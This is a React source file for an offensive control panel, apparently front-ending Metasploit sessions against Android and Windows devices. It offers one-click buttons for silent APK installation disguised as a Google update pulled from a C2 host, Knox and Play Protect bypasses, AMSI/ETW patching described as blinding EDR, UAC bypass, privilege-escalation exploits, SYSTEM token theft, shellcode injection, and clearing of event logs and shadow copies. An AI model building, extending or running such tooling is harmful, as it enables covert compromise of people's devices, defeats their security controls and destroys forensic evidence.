            <div className="text-[7px] text-green-900 tracking-widest">SECURITY STATUS</div>
            <div className={`text-[8px] flex items-center gap-1 ${detected.defenderRTP ? "text-red-500" : "text-green-600"}`}>
              <div className={`w-1.5 h-1.5 rounded-full ${detected.defenderRTP ? "bg-red-500 animate-pulse" : "bg-green-600"}`} />
              Defender {detected.defenderRTP ? "ACTIVE" : "OFF"}
            </div>
            <div className={`text-[8px] flex items-center gap-1 ${detected.firewall ? "text-yellow-600" : "text-green-600"}`}>
              <div className={`w-1.5 h-1.5 rounded-full ${detected.firewall ? "bg-yellow-500" : "bg-green-600"}`} />
              Firewall {detected.firewall ? "ON" : "OFF"}
            </div>
            <div className="text-[8px] text-green-800">{detected.runningAv.length} AV proc(s)</div>
          </div>
        )}
      </aside>

      {/* MAIN CONTENT */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <div className="flex-1 overflow-y-auto p-5">

          {/* ══════════════════════════════════════════════════
              TAB: OS MATRIX
          ══════════════════════════════════════════════════ */}
          {tab === "matrix" && (
            <div>
              <div className="mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">FULL OS SUCCESS MATRIX</h2>
                <p className="text-[8px] text-green-900/50 mt-1">Base = raw msfvenom. Max = all evasion techniques applied. Click any row for details.</p>
              </div>

              {/* Android Matrix */}
              <div className="mb-6">
                <div className="text-[9px] text-green-700 tracking-widest mb-2 border-b border-green-900/20 pb-1">
                  ANDROID  8 → 16
                </div>
                <div className="space-y-1">
                  <div className="grid grid-cols-12 text-[7px] text-green-900/40 uppercase tracking-widest px-2 mb-1">
                    <span className="col-span-3">VERSION</span>
                    <span className="col-span-2">DEVICES</span>
                    <span className="col-span-2">BASE %</span>
                    <span className="col-span-2">MAX %</span>
                    <span className="col-span-3">MAIN BLOCKER</span>
                  </div>
                  {ANDROID_VERSIONS.map((av) => (
                    <button key={av.ver} onClick={() => { setExpandedAndroid(expandedAndroid === av.ver ? null : av.ver); setTab("android"); }}
                      className={`w-full grid grid-cols-12 px-2 py-2 rounded border text-[8px] transition-all ${colorMap[av.color]} hover:${bgMap[av.color]}`}>
                      <div className="col-span-3 flex items-center gap-1.5">
                        <div className={`w-1.5 h-1.5 rounded-full shrink-0 ${dotMap[av.color]}`} />
                        <span className="text-left">{av.ver} ({av.name})</span>
                      </div>
                      <div className="col-span-2 text-green-900/50 text-left">{av.devices.split(",")[0]}</div>
                      <div className="col-span-2">
                        <div className="flex items-center gap-1">
                          <div className="h-1 bg-red-900/40 rounded-full" style={{ width: `${av.successBase}%`, maxWidth: "60px", minWidth: "8px" }} />
                          <span className="text-red-500">{av.successBase}%</span>
                        </div>
                      </div>
                      <div className="col-span-2">
                        <div className="flex items-center gap-1">
                          <div className="h-1 bg-green-600/60 rounded-full" style={{ width: `${av.successMax}%`, maxWidth: "60px", minWidth: "8px" }} />
                          <span className="text-green-400">{av.successMax}%</span>
                        </div>
                      </div>
                      <div className="col-span-3 text-green-900/50 text-left truncate">{av.blockers[0]}</div>
                    </button>
                  ))}
                </div>
              </div>

              {/* Windows Matrix */}
              <div>
                <div className="text-[9px] text-green-700 tracking-widest mb-2 border-b border-green-900/20 pb-1">
                  WINDOWS  7 → 11
                </div>
                <div className="space-y-1">
                  <div className="grid grid-cols-12 text-[7px] text-green-900/40 uppercase tracking-widest px-2 mb-1">
                    <span className="col-span-3">VERSION</span>
                    <span className="col-span-1 text-center">AMSI</span>
                    <span className="col-span-1 text-center">TPR</span>
                    <span className="col-span-1 text-center">SAC</span>
                    <span className="col-span-2">BASE %</span>
                    <span className="col-span-2">MAX %</span>
                    <span className="col-span-2">MAIN BLOCKER</span>
                  </div>
                  {WINDOWS_VERSIONS.map((wv) => (
                    <button key={wv.ver} onClick={() => { setExpandedWin(expandedWin === wv.ver ? null : wv.ver); setTab("windows"); }}
                      className={`w-full grid grid-cols-12 px-2 py-2 rounded border text-[8px] transition-all ${colorMap[wv.color]} hover:${bgMap[wv.color]}`}>
                      <div className="col-span-3 flex items-center gap-1.5">
                        <div className={`w-1.5 h-1.5 rounded-full shrink-0 ${dotMap[wv.color]}`} />
                        <span className="text-left">{wv.name}</span>
                      </div>
                      <div className={`col-span-1 text-center ${wv.amsi ? "text-red-500" : "text-green-900/30"}`}>{wv.amsi ? "YES" : "NO"}</div>
                      <div className={`col-span-1 text-center ${wv.tamper ? "text-red-500" : "text-green-900/30"}`}>{wv.tamper ? "YES" : "NO"}</div>
                      <div className={`col-span-1 text-center ${wv.sac ? "text-red-500" : "text-green-900/30"}`}>{wv.sac ? "YES" : "NO"}</div>
                      <div className="col-span-2">
                        <div className="flex items-center gap-1">
                          <div className="h-1 bg-red-900/40 rounded-full" style={{ width: `${wv.successBase}%`, maxWidth: "60px", minWidth: "8px" }} />
                          <span className="text-red-500">{wv.successBase}%</span>
                        </div>
                      </div>
                      <div className="col-span-2">
                        <div className="flex items-center gap-1">
                          <div className="h-1 bg-green-600/60 rounded-full" style={{ width: `${wv.successMax}%`, maxWidth: "60px", minWidth: "8px" }} />
                          <span className="text-green-400">{wv.successMax}%</span>
                        </div>
                      </div>
                      <div className="col-span-2 text-green-900/50 text-left truncate">{wv.blockers[0]}</div>
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: ANDROID 8-16
          ══════════════════════════════════════════════════ */}
          {tab === "android" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-1">ANDROID EVASION — ALL VERSIONS 8 → 16</h2>
              <p className="text-[8px] text-green-900/50 mb-4">Click any version to expand techniques. Execute against the selected session.</p>

              <div className="space-y-2">
                {ANDROID_VERSIONS.map((av) => {
                  const open = expandedAndroid === av.ver;
                  return (
                    <div key={av.ver} className={`border rounded transition-all ${colorMap[av.color]}`}>
                      <button className="w-full flex items-center gap-3 px-4 py-3 text-left"
                        onClick={() => setExpandedAndroid(open ? null : av.ver)}>
                        <div className={`w-2 h-2 rounded-full shrink-0 ${dotMap[av.color]}`} />
                        <span className="text-[10px] font-bold flex-1">Android {av.ver} ({av.name}) — API {av.api}</span>
                        <span className="text-[8px] text-green-900/40">{av.devices}</span>
                        <div className="flex items-center gap-3 ml-4">
                          <span className="text-[8px] text-red-500">Base: {av.successBase}%</span>
                          <span className="text-[8px] text-green-400">Max: {av.successMax}%</span>
                        </div>
                        <span className="text-[10px] text-green-900/30 ml-2">{open ? "▲" : "▼"}</span>
                      </button>

                      {open && (
                        <div className="px-4 pb-4 border-t border-green-900/20">
                          {/* Blockers */}
                          <div className="mt-3 mb-3">
                            <div className="text-[7px] text-green-900/40 tracking-widest uppercase mb-1">Active Blockers</div>
                            <div className="flex flex-wrap gap-1.5">
                              {av.blockers.map((b) => (
                                <span key={b} className="text-[8px] border border-red-900/30 text-red-600 px-2 py-0.5 rounded">{b}</span>
                              ))}
                            </div>
                          </div>

                          {/* Techniques */}
                          <div className="text-[7px] text-green-900/40 tracking-widest uppercase mb-2">Bypass Techniques</div>
                          <div className="grid grid-cols-2 gap-2 mb-3">
                            {av.techniques.map((t) => (
                              <button key={t.id} onClick={() => runAction(t.cmd, t.label)}
                                disabled={!!loading || !session}
                                className="text-left p-3 border border-green-900/20 rounded hover:border-green-700/40 hover:bg-green-950/10 transition-all disabled:opacity-40">
                                <div className="text-[9px] text-green-400 mb-0.5">{t.label}</div>
                                <div className="text-[7px] text-green-900/50">{t.desc}</div>
                              </button>
                            ))}
                          </div>

                          {/* Root CVEs */}
                          {av.rootCves.length > 0 && (
                            <div className="mb-3">
                              <div className="text-[7px] text-green-900/40 tracking-widest uppercase mb-1.5">Root/Priv-Esc CVEs</div>
                              <div className="flex flex-wrap gap-1.5">
                                {av.rootCves.map((c) => (
                                  <button key={c} onClick={() => runAction("local_exploit_suggester", c)}
                                    disabled={!!loading || !session}
                                    className="text-[8px] border border-yellow-900/40 text-yellow-600 px-2 py-1 rounded hover:bg-yellow-950/20 transition-all disabled:opacity-40">
                                    ⬆ {c}
                                  </button>
                                ))}
                              </div>
                            </div>
                          )}

                          {/* Notes */}
                          <div className="text-[8px] text-green-900/40 bg-black/20 rounded p-2 border border-green-900/10">
                            ℹ {av.notes}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: ZERO-INSTALL (Android 8→16)
          ══════════════════════════════════════════════════ */}
          {tab === "zeroinstall" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">ZERO-FRICTION INSTALL — ANDROID 8→16</h2>
              <p className="text-[8px] text-green-900/50 mb-4">
                Hardcoded install chains per API level. No Play Protect dialogs, no user taps when ADB or root shell is available.
                Use Meterpreter session actions or copy ADB commands for pre-access delivery.
              </p>

              {/* One-click session actions */}
              <div className="grid grid-cols-3 gap-3 mb-5">
                {[
                  { action: "android_zero_install", label: "ZERO-INSTALL (session)", desc: "Disable all blockers + pm install + start service", needsSession: true },
                  { action: "android_enable_adb",   label: "ENABLE ADB TCP",         desc: "Open port 5555 on target via Meterpreter shell", needsSession: true },
                  { action: "android_adb_install",  label: "ADB SILENT INSTALL",     desc: "Full ADB command chain — copy and run from Kali", needsSession: false },
                ].map(({ action, label, desc, needsSession }) => (
                  <button key={action}
                    onClick={async () => {
                      if (needsSession && !session) { addLog("Select a session first", "err"); return; }
                      setLoading(action);
                      const res = needsSession
                        ? await call(action, { package: "com.google.services.update", apk_path: apkPath, target_ip: targetIp || undefined, apk_url: `http://${session?.ip ?? "C2"}/payload.apk` })
                        : await fetch("/api/evasion", { method: "POST", headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ action, target_ip: targetIp || "<TARGET_IP>", apk_url: "http://YOUR_C2/payload.apk" }) }).then(r => r.json());
                      setLoading(null);
                      setZeroInstallResult(res as Record<string, unknown>);
                      addLog(res.ok ? `${label} — ready` : `${label} failed`, res.ok ? "ok" : "err");
                    }}
                    disabled={!!loading || (needsSession && !session)}
                    className="border border-cyan-900/30 rounded p-3 text-left hover:border-cyan-700/40 transition-all disabled:opacity-40">
                    <div className="text-[9px] text-cyan-400 mb-1">{label}</div>
                    <div className="text-[7px] text-green-900/50">{desc}</div>
                  </button>
                ))}
              </div>

              <div className="grid grid-cols-2 gap-3 mb-5">
                <div>
                  <label className="text-[8px] text-green-700 block mb-1">TARGET IP (ADB TCP)</label>
                  <input value={targetIp} onChange={e => setTargetIp(e.target.value)}
                    placeholder="192.168.1.50"
                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none" />
                </div>
                <div>
                  <label className="text-[8px] text-green-700 block mb-1">APK PATH ON DEVICE</label>
                  <input value={apkPath} onChange={e => setApkPath(e.target.value)}
                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none" />
                </div>
              </div>

              {zeroInstallResult?.data && (
                <div className="border border-green-900/20 rounded p-3 mb-5">
                  <div className="text-[8px] text-green-600 mb-2">LAST RESULT</div>
                  <pre className="text-[7px] text-green-400 bg-black/40 rounded p-2 overflow-x-auto max-h-40">
                    {JSON.stringify(zeroInstallResult.data, null, 2)}
                  </pre>
                </div>
              )}

              {/* Per-version hardcoded chains */}
              <div className="space-y-3">
                {ANDROID_ZERO_INSTALL.map((chain) => (
                  <div key={chain.ver} className="border border-green-900/20 rounded p-4">
                    <div className="flex items-center gap-3 mb-2">
                      <span className="text-[10px] text-green-400 font-bold">{chain.ver}</span>
                      <span className="text-[7px] text-cyan-700">{chain.path}</span>
                      <span className={`text-[8px] font-bold ml-auto ${chain.success >= 95 ? "text-green-400" : chain.success >= 88 ? "text-yellow-400" : "text-orange-500"}`}>
                        {chain.success}%
                      </span>
                    </div>
                    <div className="space-y-1">
                      {chain.cmds.map((cmd) => (
                        <div key={cmd} className="flex items-center gap-2 group">
                          <code className="flex-1 text-[7px] text-green-300 bg-black/30 rounded px-2 py-1 overflow-x-auto">{cmd}</code>
                          <button onClick={() => copyCmd(cmd)}
                            className="text-[6px] text-green-900/40 hover:text-green-500 px-1 opacity-0 group-hover:opacity-100 transition-all shrink-0">
                            {copiedCmd === cmd ? "✓" : "cp"}
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>

              <div className="mt-4 border border-cyan-900/20 rounded p-3 text-[8px] text-green-900/50">
                iOS 14–18 zero-install chains → see <span className="text-cyan-600">iOS OPS CENTER</span> → Delivery Chain tab.
                MDM profile works on all iOS versions with 2 taps only.
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: KNOX BYPASS
          ══════════════════════════════════════════════════ */}
          {tab === "knox" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-1">SAMSUNG KNOX NEUTRALIZER</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Knox Vault lives in TrustZone RPMB — no software bypass. Knox Guard enforcement is software-side.
                The 6-phase approach kills the enforcement chain from within system_server.
              </p>

              <div className="grid grid-cols-2 gap-5">
                {/* Left: ADB Commands */}
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3 border-b border-green-900/20 pb-1">
                    ADB OVER NETWORK — TARGET DEVICE COMMANDS
                  </div>
                  <div className="space-y-1.5">
                    {KNOX_ADB_CMDS.map((c) => (
                      <div key={c.label} className="border border-green-900/20 rounded overflow-hidden">
                        <div className="flex items-center justify-between px-3 py-1.5 bg-black/20">
                          <span className="text-[8px] text-green-600">{c.label}</span>
                          <button onClick={() => copyCmd(c.cmd)}
                            className="text-[7px] text-green-900 hover:text-green-500 transition-all px-1">
                            {copiedCmd === c.cmd ? "✓ copied" : "copy"}
                          </button>
                        </div>
                        <div className="px-3 py-1.5 bg-black/40">
                          <code className="text-[8px] text-green-300 break-all">{c.cmd}</code>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Right: 6-phase Knox Guard neutralizer */}
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3 border-b border-green-900/20 pb-1">
                    6-PHASE KNOX GUARD NEUTRALIZER (REQUIRES SYSTEM SHELL)
                  </div>
                  <div className="space-y-2 mb-4">
                    {KNOX_PHASES.map((p) => (
                      <div key={p.phase} className="border border-yellow-900/20 rounded p-3">
                        <div className="flex items-center gap-2 mb-1">
                          <div className="w-5 h-5 rounded border border-yellow-700/50 flex items-center justify-center text-[8px] text-yellow-600 shrink-0">
                            {p.phase}
                          </div>
                          <span className="text-[9px] text-yellow-400">{p.name}</span>
                        </div>
                        <p className="text-[7px] text-green-900/50 ml-7">{p.detail}</p>
                      </div>
                    ))}
                  </div>

                  <button onClick={() => runAction("knox_neutralize", "Knox Guard 6-phase neutralize")}
                    disabled={!!loading || !session}
                    className="w-full py-2 text-[9px] border border-yellow-700/50 text-yellow-400 rounded hover:bg-yellow-950/20 transition-all disabled:opacity-40 tracking-widest">
                    ▶ EXECUTE ALL 6 PHASES ON SESSION
                  </button>

                  <div className="mt-4 border border-green-900/10 rounded p-3 text-[7px] text-green-900/40 space-y-1">
                    <div className="text-[8px] text-green-800 mb-1">Knox Security Reality Check:</div>
                    <div>• Knox Vault (fingerprints, Samsung Pay keys): Hardware-backed in TrustZone RPMB. <span className="text-red-700">No software bypass.</span></div>
                    <div>• Knox Guard (enterprise lock): Software enforcement via kgclient + KnoxGuardSeService. <span className="text-yellow-700">6-phase neutralizer works.</span></div>
                    <div>• Auto Blocker (sideload block): Settings flag. <span className="text-green-700">One ADB command disables it.</span></div>
                    <div>• FreecessController (process freeze): Settings flag. <span className="text-green-700">Foreground service + FG type beats it.</span></div>
                    <div>• Play Protect: ML + signature. <span className="text-green-700">Package rename + keystore + smali obfuscation beats it.</span></div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: WINDOWS 7-11
          ══════════════════════════════════════════════════ */}
          {tab === "windows" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-1">WINDOWS EVASION — ALL VERSIONS 7 → 11</h2>
              <p className="text-[8px] text-green-900/50 mb-4">Per-version breakdown: blockers, techniques, and live execution buttons.</p>

              <div className="space-y-2">
                {WINDOWS_VERSIONS.map((wv) => {
                  const open = expandedWin === wv.ver;
                  return (
                    <div key={wv.ver} className={`border rounded transition-all ${colorMap[wv.color]}`}>
                      <button className="w-full flex items-center gap-3 px-4 py-3 text-left"
                        onClick={() => setExpandedWin(open ? null : wv.ver)}>
                        <div className={`w-2 h-2 rounded-full shrink-0 ${dotMap[wv.color]}`} />
                        <span className="text-[10px] font-bold flex-1">{wv.name}</span>
                        <div className="flex items-center gap-2 text-[7px]">
                          {wv.amsi && <span className="border border-red-900/40 text-red-600 px-1 rounded">AMSI</span>}
                          {wv.tamper && <span className="border border-red-900/40 text-red-600 px-1 rounded">TPR</span>}
                          {wv.sac && <span className="border border-red-900/40 text-red-600 px-1 rounded">SAC</span>}
                        </div>
                        <div className="flex items-center gap-3 ml-3">
                          <span className="text-[8px] text-red-500">Base: {wv.successBase}%</span>
                          <span className="text-[8px] text-green-400">Max: {wv.successMax}%</span>
                        </div>
                        <span className="text-[10px] text-green-900/30 ml-2">{open ? "▲" : "▼"}</span>
                      </button>

                      {open && (
                        <div className="px-4 pb-4 border-t border-green-900/20">
                          <div className="mt-3 mb-3">
                            <div className="text-[7px] text-green-900/40 tracking-widest uppercase mb-1">Active Blockers</div>
                            <div className="flex flex-wrap gap-1.5">
                              {wv.blockers.map((b) => (
                                <span key={b} className="text-[8px] border border-red-900/30 text-red-600 px-2 py-0.5 rounded">{b}</span>
                              ))}
                            </div>
                          </div>

                          <div className="text-[7px] text-green-900/40 tracking-widest uppercase mb-2">Bypass Techniques</div>
                          <div className="space-y-1.5 mb-3">
                            {wv.techniques.map((t) => (
                              <div key={t.label} className="border border-green-900/15 rounded p-3 flex items-start justify-between gap-3">
                                <div>
                                  <div className="text-[9px] text-green-400 mb-0.5">{t.label}</div>
                                  <div className="text-[7px] text-green-900/50">{t.desc}</div>
                                </div>
                                <button
                                  onClick={() => runAction(t.label.toLowerCase().replace(/[^a-z0-9]/g, "_"), t.label)}
                                  disabled={!!loading || !session}
                                  className="shrink-0 px-3 py-1 text-[8px] border border-green-700/30 rounded hover:bg-green-950/20 transition-all disabled:opacity-40">
                                  RUN
                                </button>
                              </div>
                            ))}
                          </div>

                          <div className="text-[8px] text-green-900/40 bg-black/20 rounded p-2 border border-green-900/10">
                            ℹ {wv.notes}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: PRIVILEGE ESCALATION
          ══════════════════════════════════════════════════ */}
          {tab === "privesc" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-1">PRIVILEGE ESCALATION</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Android: achieve root from user session. Windows: achieve SYSTEM from any foothold.
                Always run auto-suggest first — it scans 50+ exploits automatically.
              </p>

              <div className="grid grid-cols-2 gap-6">
                {/* Android privesc */}
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3 border-b border-green-900/20 pb-1">
                    ANDROID ROOT ESCALATION
                  </div>
                  <div className="space-y-2">
                    {PRIVESC_ANDROID.map((e) => (
                      <div key={e.cve} className={`border rounded p-3 ${e.cve === "Auto-suggest" ? "border-green-700/40" : "border-yellow-900/20"}`}>
                        <div className="flex items-start justify-between gap-2 mb-1">
                          <div>
                            <span className={`text-[9px] font-bold ${e.cve === "Auto-suggest" ? "text-green-400" : "text-yellow-500"}`}>{e.cve}</span>
                            <div className="text-[7px] text-green-900/40 mt-0.5">{e.target}</div>
                          </div>
                          <button onClick={() => runAction(e.msf, e.cve)}
                            disabled={!!loading || !session}
                            className={`shrink-0 px-3 py-1 text-[8px] rounded border transition-all disabled:opacity-40 ${
                              e.cve === "Auto-suggest"
                                ? "border-green-700/50 text-green-400 hover:bg-green-950/20"
                                : "border-yellow-900/30 text-yellow-600 hover:bg-yellow-950/20"
                            }`}>
                            {e.cve === "Auto-suggest" ? "AUTO SCAN" : "EXPLOIT"}
                          </button>
                        </div>
                        <div className="text-[8px] text-green-400/70 mb-0.5">{e.impact}</div>
                        <div className="text-[7px] text-green-900/40">{e.note}</div>
                        <code className="text-[7px] text-green-900/30 block mt-1">{e.msf}</code>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Windows privesc */}
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3 border-b border-green-900/20 pb-1">
                    WINDOWS SYSTEM ESCALATION
                  </div>
                  <div className="space-y-2">
                    {PRIVESC_WINDOWS.map((e) => (
                      <div key={e.cve} className={`border rounded p-3 ${e.cve === "Auto-suggest" ? "border-green-700/40" : "border-yellow-900/20"}`}>
                        <div className="flex items-start justify-between gap-2 mb-1">
                          <div>
                            <span className={`text-[9px] font-bold ${e.cve === "Auto-suggest" ? "text-green-400" : "text-yellow-500"}`}>{e.cve}</span>
                            <div className="text-[7px] text-green-900/40 mt-0.5">{e.target}</div>
                          </div>
                          <button onClick={() => runAction(e.msf, e.cve)}
                            disabled={!!loading || !session}
                            className={`shrink-0 px-3 py-1 text-[8px] rounded border transition-all disabled:opacity-40 ${
                              e.cve === "Auto-suggest"
                                ? "border-green-700/50 text-green-400 hover:bg-green-950/20"
                                : "border-yellow-900/30 text-yellow-600 hover:bg-yellow-950/20"
                            }`}>
                            {e.cve === "Auto-suggest" ? "AUTO SCAN" : "EXPLOIT"}
                          </button>
                        </div>
                        <div className="text-[8px] text-green-400/70 mb-0.5">{e.impact}</div>
                        <div className="text-[7px] text-green-900/40">{e.note}</div>
                        <code className="text-[7px] text-green-900/30 block mt-1">{e.msf}</code>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: AMSI / ETW
          ══════════════════════════════════════════════════ */}
          {tab === "amsi" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-2">AMSI + ETW BYPASS</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                AMSI scans PowerShell, .NET, WScript. ETW feeds CrowdStrike/SentinelOne behavioral sensors.
                Modern bypass: hardware breakpoints (no byte patch) + ETW provider null-out.
              </p>
              <div className="grid grid-cols-1 gap-3 max-w-2xl">
                {[
                  { label: "AMSI: Hardware Breakpoint (VEH)",  action: "amsi_hwbp",     badge: "UNDETECTABLE", desc: "AddVectoredExceptionHandler sets DR0 on AmsiScanBuffer. No byte modification = no integrity check trigger. Works Win10 1703 → Win11 24H2." },
                  { label: "AMSI: amsiInitFailed reflection",  action: "amsi_bypass",   badge: "PATCHED ON WIN11", desc: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed'...) — detected as compound signature on Win11." },
                  { label: "AMSI: .NET Assembly AMSI bypass",  action: "amsi_dotnet",   badge: "MEMORY ONLY", desc: "Patch amsi.dll AmsiScanBuffer to return S_OK (0x80070057) in loaded CLR — bypasses .NET assembly scanning." },
                  { label: "ETW: EtwEventWrite null-out",      action: "etw_bypass",    badge: "MEMORY ONLY", desc: "Zero out EtwEventWrite return address in ntdll — silences all ETW telemetry for current process. Blinds EDR sensors." },
                  { label: "Constrained Language Mode bypass", action: "ev_clm_bypass", badge: "PS ONLY",    desc: "__PSLockdownPolicy env var = 0 exits CLM. Required before running any PS modules in locked-down environments." },
                  { label: "Disable Script Block Logging",     action: "clear_logs",    badge: "REGISTRY",   desc: "HKLM\\...\\ScriptBlockLogging Enabled=0. Stops PS from logging executed scripts to event log 4104." },
                ].map(({ label, action, badge, desc }) => (
                  <div key={label} className="border border-green-900/20 rounded p-4 flex items-center justify-between gap-4">
                    <div>
                      <div className="text-[9px] text-green-400 mb-0.5 flex items-center gap-2">
                        {label}
                        <span className={`text-[7px] border px-1 rounded ${
                          badge === "UNDETECTABLE" ? "border-green-700/40 text-green-700" :
                          badge === "PATCHED ON WIN11" ? "border-red-900/40 text-red-800" :
                          "border-green-900/30 text-green-900"
                        }`}>{badge}</span>
                      </div>
                      <div className="text-[8px] text-green-900/50">{desc}</div>
                    </div>
                    <button onClick={() => runAction(action, label)} disabled={!!loading || !session}
                      className="shrink-0 px-4 py-1.5 text-[9px] border border-green-700/40 rounded hover:bg-green-950/30 transition-all disabled:opacity-40">
                      RUN
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: UAC BYPASS
          ══════════════════════════════════════════════════ */}
          {tab === "uac" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-5">UAC BYPASS — WINDOWS</h2>
              <div className="grid grid-cols-3 gap-3 mb-5">
                {UAC_METHODS.map((m) => (
                  <button key={m.id} onClick={() => setUacMethod(m.id)}
                    className={`text-left p-3 border rounded transition-all ${
                      uacMethod === m.id ? "border-yellow-700/60 bg-yellow-950/20" : "border-green-900/20 hover:border-green-800/30"
                    }`}>
                    <div className={`text-[9px] mb-1 ${uacMethod === m.id ? "text-yellow-400" : "text-green-600"}`}>{m.label}</div>
                    <div className="text-[7px] text-green-900/40">{m.os}</div>
                    <div className={`text-[7px] mt-1 ${m.risk === "high" ? "text-red-700" : m.risk === "medium" ? "text-yellow-800" : "text-green-800"}`}>
                      RISK: {m.risk.toUpperCase()}
                    </div>
                  </button>
                ))}
              </div>
              <button onClick={() => runAction("uac_bypass", `UAC bypass (${uacMethod})`, { method: uacMethod })}
                disabled={!!loading || !session}
                className="px-6 py-2 text-[9px] border border-yellow-700/50 text-yellow-400 rounded hover:bg-yellow-950/20 transition-all disabled:opacity-40 tracking-widest">
                ▶ EXECUTE UAC BYPASS — {uacMethod.toUpperCase()}
              </button>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: MIGRATE
          ══════════════════════════════════════════════════ */}
          {tab === "migrate" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-2">PROCESS MIGRATION + INJECTION</h2>
              <p className="text-[8px] text-green-900/50 mb-5">
                Migrate into a trusted process so the session survives if the exploit vehicle closes.
                TiWorker.exe → TrustedInstaller token. svchost.exe → SYSTEM token.
              </p>
              <div className="grid grid-cols-2 gap-5">
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">TARGET PROCESS</div>
                  <div className="space-y-2 mb-4">
                    {MIGRATE_PROCS.map((p) => (
                      <button key={p.name} onClick={() => setMigrateProc(p.name)}
                        className={`w-full text-left p-3 border rounded transition-all flex items-center gap-4 ${
                          migrateProc === p.name ? "border-green-700/60 bg-green-950/20" : "border-green-900/20 hover:border-green-800/30"
                        }`}>
                        <div className={`w-2 h-2 rounded-full ${migrateProc === p.name ? "bg-green-400" : "bg-green-900"}`} />
                        <span className="font-mono text-[9px] text-green-400 w-40">{p.name}</span>
                        <span className="text-[7px] text-green-900/50">{p.reason}</span>
                      </button>
                    ))}
                  </div>
                  <div className="flex gap-2">
                    <button onClick={() => runAction("migrate", `Migrate → ${migrateProc}`, { process: migrateProc })}
                      disabled={!!loading || !session}
                      className="flex-1 py-2 text-[9px] border border-green-700/50 rounded hover:bg-green-950/30 transition-all disabled:opacity-40 tracking-widest">
                      ▶ MIGRATE → {migrateProc}
                    </button>
                    <button onClick={() => runAction("token_steal", "Steal SYSTEM token", { pid: 4 })}
                      disabled={!!loading || !session}
                      className="px-4 py-2 text-[9px] border border-yellow-700/40 text-yellow-600 rounded hover:bg-yellow-950/20 transition-all disabled:opacity-40">
                      STEAL TOKEN
                    </button>
                  </div>
                </div>

                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-3">SHELLCODE INJECTION</div>
                  <div className="mb-3">
                    <label className="block text-[8px] text-green-900/50 mb-1">Target PID (0 = auto select svchost)</label>
                    <input value={injectPid} onChange={(e) => setInjectPid(e.target.value)} placeholder="1234"
                      className="w-full mb-2 bg-black/30 border border-green-900/30 rounded px-3 py-1.5 text-[9px] text-green-400 focus:outline-none focus:border-green-700" />
                    <button onClick={() => runAction("inject", "Shellcode injection", { pid: parseInt(injectPid) || 0 })}
                      disabled={!!loading || !session}
                      className="w-full py-2 text-[9px] border border-red-800/50 text-red-500 rounded hover:bg-red-950/20 transition-all disabled:opacity-40">
                      💉 INJECT SHELLCODE
                    </button>
                  </div>
                  <div className="space-y-1.5">
                    {[
                      { label: "PPID Spoofing",         desc: "Fake parent PID → hide malicious parent-child in process tree" },
                      { label: "Process Hollowing",     desc: "Spawn suspended process, replace memory image, resume" },
                      { label: "Reflective DLL",        desc: "In-memory DLL load via PE loader — zero disk artifacts" },
                      { label: "Direct Syscalls",       desc: "Bypass ntdll hooks via raw syscall numbers (SysWhispers3)" },
                    ].map(({ label, desc }) => (
                      <div key={label} className="border border-green-900/15 rounded p-2.5">
                        <div className="text-[9px] text-green-600 mb-0.5">{label}</div>
                        <div className="text-[7px] text-green-900/40">{desc}</div>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ══════════════════════════════════════════════════
              TAB: CLEAN LOGS
          ══════════════════════════════════════════════════ */}
          {tab === "logs" && (
            <div>
              <h2 className="text-[11px] tracking-widest text-green-400 mb-5">FORENSIC LOG CLEARING</h2>
              <div className="grid grid-cols-2 gap-3 mb-5">
                {[
                  { label: "Clear All Event Logs",        action: "clear_logs",  desc: "Security, System, Application, PowerShell, Sysmon, Defender",  danger: true },
                  { label: "Delete VSS Shadow Copies",    action: "disable_vss", desc: "vssadmin + wmic + bcdedit /set recoveryenabled No",             danger: true },
                  { label: "Wipe PowerShell History",     action: "clear_logs",  desc: "PSReadline ConsoleHost_history.txt + in-memory Clear-History",  danger: false },
                  { label: "Clear Prefetch Files",        action: "clear_logs",  desc: "C:\\Windows\\Prefetch\\*.pf — execution timeline evidence",     danger: false },
